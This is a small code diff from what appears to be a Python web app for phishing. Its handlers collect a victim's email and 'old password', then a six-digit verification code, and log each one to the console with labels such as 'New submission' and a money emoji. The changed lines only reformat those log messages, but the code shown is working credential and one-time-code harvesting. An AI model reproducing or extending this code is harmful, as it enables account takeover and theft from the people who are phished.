@@ -30,7 +30,7 @@ async def submit_form(email: str = Form(...), old_password: str = Form(...)):
     query_params = urlencode({"email": email, "old-password": old_password})
     __now = datetime.now().strftime("%H:%M")
     print(
-        f"\n {__now} >> 🚀 New submission | Email: {email}, password: {old_password} \n"
+        f"\n{__now} >>> 🚀 New submission | Email: {email}, password: {old_password} \n"
     )
     return RedirectResponse(url=f"/login-code?{query_params}", status_code=303)
 
@@ -61,7 +61,7 @@ async def login(
     code = f"{num1}{num2}{num3}{num4}{num5}{num6}"
     __now = datetime.now().strftime("%H:%M")
     print(
-        f"\n {__now} >> 💰 Verification code for {email}: {code} (password: {old_password})\n"
+        f"\n{__now} >>> 💰 Verification code for {email}: {code} (password: {old_password})\n"
     )
 
     with open("change-password.html", "r") as f:
